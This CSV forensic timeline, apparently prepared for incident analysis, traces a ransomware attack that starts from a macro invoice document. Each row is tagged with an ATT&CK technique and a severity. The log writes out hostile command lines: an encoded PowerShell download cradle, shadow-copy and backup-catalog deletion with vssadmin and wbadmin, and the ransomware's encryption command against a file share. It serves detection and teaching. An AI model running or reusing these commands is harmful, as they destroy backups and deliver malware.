timestamp,source,summary,detail,technique,description,severity
2026-02-27T09:14:00,Registry (Run key),HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveSync,C:\Program Files\Microsoft OneDrive\OneDrive.exe /background,,Legitimate startup entry,INFO
2026-03-11T09:03:40,Process Creation (Sysmon/Security 4688),"C:\Windows\explorer.exe (PID 2104, parent C:\Windows\System32\userinit.exe)",C:\Windows\explorer.exe,,,INFO
2026-03-11T09:09:00,Process Creation (Sysmon/Security 4688),"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE (PID 3312, parent C:\Windows\explorer.exe)","""OUTLOOK.EXE""",,,INFO
2026-03-11T09:11:00,Process Creation (Sysmon/Security 4688),"C:\Windows\System32\taskhostw.exe (PID 2990, parent C:\Windows\System32\svchost.exe)",taskhostw.exe {WindowsUpdateCheck},,,INFO
2026-03-11T09:14:00,Process Creation (Sysmon/Security 4688),"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE (PID 4488, parent C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE)","""WINWORD.EXE"" /n ""C:\Users\j.morales\Downloads\Invoice_84421.docm""",,,INFO
2026-03-11T09:14:41,Process Creation (Sysmon/Security 4688),"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID 4602, parent C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE)",powershell.exe -NoP -W Hidden -Exec Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAn,T1566.001 / T1059.001,Spearphishing Attachment spawning obfuscated PowerShell,CRITICAL
2026-03-11T09:14:53,Process Creation (Sysmon/Security 4688),"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID 4602, parent C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe)",outbound connection to 185.220.101.47:443 (TLS),T1105,Ingress Tool Transfer (outbound payload retrieval),HIGH
2026-03-11T09:14:58,Process Creation (Sysmon/Security 4688),"C:\Users\j.morales\AppData\Local\Temp\svchost_upd.exe (PID 4711, parent C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe)",C:\Users\j.morales\AppData\Local\Temp\svchost_upd.exe,,,INFO
2026-03-11T09:15:00,Registry (Run key),HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSvcHelper,C:\Users\j.morales\AppData\Local\Temp\svchost_upd.exe -silent,T1547.001,Registry Run Key persistence pointing to a user-writable path,HIGH
2026-03-11T09:15:15,Process Creation (Sysmon/Security 4688),"C:\Windows\System32\vssadmin.exe (PID 4790, parent C:\Users\j.morales\AppData\Local\Temp\svchost_upd.exe)",vssadmin.exe delete shadows /all /quiet,T1490,Inhibit System Recovery (shadow copy / backup catalog deletion),CRITICAL
2026-03-11T09:15:19,Process Creation (Sysmon/Security 4688),"C:\Windows\System32\wbadmin.exe (PID 4803, parent C:\Users\j.morales\AppData\Local\Temp\svchost_upd.exe)",wbadmin.exe delete catalog -quiet,T1490,Inhibit System Recovery (shadow copy / backup catalog deletion),CRITICAL
2026-03-11T09:15:32,Process Creation (Sysmon/Security 4688),"C:\Windows\System32\whoami.exe (PID 4820, parent C:\Users\j.morales\AppData\Local\Temp\svchost_upd.exe)",whoami.exe /all,T1082 / T1018,System / Remote System Discovery,MEDIUM
2026-03-11T09:15:35,Process Creation (Sysmon/Security 4688),"C:\Windows\System32\net.exe (PID 4830, parent C:\Users\j.morales\AppData\Local\Temp\svchost_upd.exe)",net.exe view \\FS01-CORP,T1082 / T1018,System / Remote System Discovery,MEDIUM
2026-03-11T09:16:20,Process Creation (Sysmon/Security 4688),"C:\Users\j.morales\AppData\Local\Temp\svchost_upd.exe (PID 4711, parent C:\Users\j.morales\AppData\Local\Temp\svchost_upd.exe)",C:\Users\j.morales\AppData\Local\Temp\svchost_upd.exe --encrypt --path=C:\Users\j.morales --path=\\FS01-CORP\Shared,T1486,Data Encrypted for Impact,CRITICAL
2026-03-11T09:16:21,Filesystem (MFT/USN activity),180 files renamed with ransomware extension across 5 directories,"Burst pattern: high-rate sequential rename, single process handle",T1486,Data Encrypted for Impact (mass encryption burst),CRITICAL
2026-03-11T09:18:56.860000,Filesystem (MFT/USN activity),C:\Users\j.morales\Documents\README_DECRYPT.txt,action=create,T1491.001,Ransom note dropped (Internal Defacement / extortion notice),CRITICAL
2026-03-11T09:18:58.860000,Filesystem (MFT/USN activity),C:\Users\j.morales\Desktop\README_DECRYPT.txt,action=create,T1491.001,Ransom note dropped (Internal Defacement / extortion notice),CRITICAL
2026-03-11T09:19:00.860000,Filesystem (MFT/USN activity),C:\Users\j.morales\Pictures\README_DECRYPT.txt,action=create,T1491.001,Ransom note dropped (Internal Defacement / extortion notice),CRITICAL
2026-03-11T09:19:02.860000,Filesystem (MFT/USN activity),\\FS01-CORP\Shared\Finance\README_DECRYPT.txt,action=create,T1491.001,Ransom note dropped (Internal Defacement / extortion notice),CRITICAL
2026-03-11T09:19:04.860000,Filesystem (MFT/USN activity),\\FS01-CORP\Shared\HR\README_DECRYPT.txt,action=create,T1491.001,Ransom note dropped (Internal Defacement / extortion notice),CRITICAL
